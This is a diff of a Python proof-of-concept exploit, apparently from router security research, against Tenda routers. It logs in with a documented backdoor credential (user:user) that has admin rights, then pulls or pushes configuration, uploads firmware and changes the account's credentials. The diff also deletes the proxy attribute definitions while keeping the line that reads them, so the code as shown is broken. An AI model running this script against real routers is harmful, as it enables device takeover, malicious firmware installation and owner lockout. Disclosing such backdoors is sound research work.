@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 
 '''
-This PoCs uses Tendas backdoor credential user:user to leverage httpd bugs and funtionalities. Despite being named user, this account can do anything admin can.
+This PoCs uses Tendas backdoor default credential user:user to leverage httpd bugs and funtionalities. Despite being named user, this account can do anything admin account can.
 Another quirk with this is after logged in, we can use cookies=user to avoid using provided cookies altogether. cookies in this case is backdoor account password.
-There is web function that let normal user modify this account, but not exposed to the UI.
-
+There is a web function that let logged in user modify this account, but not exposed to the UI.
 '''
 
 import requests, sys
@@ -16,8 +15,6 @@ class Tendown:
         self.username = username
         self.password = password
         self.cookie = password
-        self.http_proxy="http://192.168.0.147:8080"
-        self.https_proxy="http://192.168.0.147:8080"
         self.proxyDict = {"http":self.http_proxy, "https":self.https_proxy}
 
     def login(self):
@@ -38,13 +35,13 @@ class Tendown:
 
     def post_request(self, url, pdata):
         try:
-            r = requests.post('http://' + self.ip + ':' + str(self.port) + url, cookies={'password':self.cookie}, data=pdata, allow_redirects=False)#, proxies=self.proxyDict)
+            r = requests.post('http://' + self.ip + ':' + str(self.port) + url, cookies={'password':self.cookie}, data=pdata, allow_redirects=False)
         except:
             raise RuntimeError('Connection Error!')
         if r.status_code != 200:
             self.cookie = self.password
             try:
-                r = requests.post('http://' + self.ip + ':' + str(self.port) + url, cookies={'password':self.cookie}, data=pdata, allow_redirects=False)#, proxies=self.proxyDict)
+                r = requests.post('http://' + self.ip + ':' + str(self.port) + url, cookies={'password':self.cookie}, data=pdata, allow_redirects=False)
             except:
                 raise RuntimeError('Connection Error!')
             if r.status_code != 200:
@@ -52,7 +49,7 @@ class Tendown:
 
     def firmware_update(self, filename):
         try:
-            r = requests.post('http://' + self.ip + ':' + str(self.port) + '/cgi-bin/upgrade', cookies={'password':self.cookie}, files={'upgradeFile':open(filename, 'rb')}, allow_redirects=False)#, proxies=proxyDict)
+            r = requests.post('http://' + self.ip + ':' + str(self.port) + '/cgi-bin/upgrade', cookies={'password':self.cookie}, files={'upgradeFile':open(filename, 'rb')}, allow_redirects=False)
         except:
             raise RuntimeError('Connection Error!') 
         if r.status_code != 302:
@@ -95,16 +92,13 @@ class Tendown:
         print('Config upgrade in process')
 
 if __name__ == "__main__":
-	http_proxy="http://192.168.0.147:8080"
-	https_proxy="http://192.168.0.147:8080"
-	proxyDict = {"http":http_proxy, "https":https_proxy}
 	t = Tendown('192.168.0.1', '80', 'user', 'user')
 	try:
 		t.login()
 	except RuntimeError as e:
 		print(str(e))
 		sys.exit()
-	# t.push_config('/mnt/Work/tenda/config.txt')
+	# t.push_config('config.txt')
 	t.pull_config()
-	# t.firmware_update('/mnt/Work/tenda/upgrade.bin')
-	# t.change_creds('user', 'user')
+	# t.firmware_update('../../Binaries/upgrade.bin')
+	# t.change_creds('user1', 'user1')
